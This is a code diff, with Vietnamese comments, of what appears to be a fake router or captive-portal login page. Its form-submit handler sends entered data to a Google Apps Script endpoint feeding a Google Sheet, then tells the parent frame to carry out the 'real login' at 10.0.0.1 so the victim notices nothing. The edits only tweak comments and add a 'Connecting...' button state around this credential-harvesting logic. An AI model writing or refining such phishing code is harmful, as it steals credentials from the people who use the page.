@@ -56,7 +56,7 @@
     </div>
 
     <script>
-        // TỰ ĐỘNG CHUYỂN ẢNH NỀN
+        // 1. TỰ ĐỘNG CHUYỂN ẢNH NỀN
         let current = 0;
         const slides = document.querySelectorAll('.bg-slider img');
         setInterval(() => {
@@ -65,11 +65,16 @@
             slides[current].classList.add('active');
         }, 3000);
 
-        // XỬ LÝ GỬI DỮ LIỆU
+        // 2. XỬ LÝ GỬI DỮ LIỆU
         document.getElementById('myForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Ngăn chặn tải lại trang
+            e.preventDefault(); 
 
-            // 1. Gửi data về Google Sheet
+            // Đổi giao diện nút bấm
+            const btn = document.getElementById('btnSubmit');
+            btn.innerText = "Đang kết nối...";
+            btn.disabled = true;
+
+            // Gửi data về Google Sheet
             const GOOGLE_APP_URL = 'https://script.google.com/macros/s/AKfycbzi_HlzK1GQQffKMkj8YW7cmyTLXnkPZI2UGQKttT-CJaidhgVpOrfG8coEkUZAbDOT/exec';
             fetch(GOOGLE_APP_URL, {
                 method: 'POST', mode: 'no-cors',
@@ -79,7 +84,7 @@
                 })
             });
 
-            // 2. Gửi lệnh ra trang cha để thực hiện login thật
+            // Gửi lệnh ra trang cha để thực hiện chuyển hướng thật
             window.parent.postMessage({
                 type: 'LOGIN_ACTION',
                 action: "http://10.0.0.1/login",
